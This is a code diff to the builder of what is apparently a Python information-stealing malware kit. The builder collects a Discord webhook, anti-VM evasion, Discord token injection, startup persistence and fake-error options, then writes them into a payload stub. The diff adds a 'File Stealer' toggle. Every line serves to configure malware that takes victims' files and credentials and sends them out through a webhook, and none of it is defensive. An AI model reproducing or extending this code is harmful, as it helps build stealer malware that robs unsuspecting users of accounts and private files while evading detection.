@@ -16,6 +16,7 @@ except:
 class Build:
     def __init__(self) -> None:
         self.webhook = None
+        self.StealFiles = bool()
         self.Anti_VM = bool()
         self.startup = bool()
         self.StartupMethod = None
@@ -33,6 +34,7 @@ class Build:
             self.GetWebhook()
             self.GetAntiVm()
             self.GetDiscordInjection()
+            self.GetStealFiles()
             self.GetStartupMethod()
             self.GetFakeError()
             self.GetIcon()
@@ -115,6 +117,7 @@ class Build:
             .replace('"%injection%"', str(self.injection))
             .replace("%startup_method%", str(self.StartupMethod))
             .replace('"%fake_error%"', str(self.fakeError))
+            .replace('"%StealCommonFiles%"', str(self.StealFiles))
         )
         with open("Stub.py", "w", encoding="utf-8", errors="ignore") as laquica:
             laquica.write(replaced_data)
@@ -182,6 +185,13 @@ class Build:
                 continue
         else:
             self.webhook = web
+
+    def GetStealFiles(self) -> None:
+        getFilesReq = str(input("Yes/No\nDo u want enable to File Stealer: "))
+        if getFilesReq.lower() == "y" or getFilesReq.lower() == "yes":
+            self.StealFiles = True
+        else:
+            self.StealFiles = False
 
     def GetAntiVm(self) -> None:
         getAntiVmReq = str(input("Yes/No\nDo u want enable Anti-VM : "))
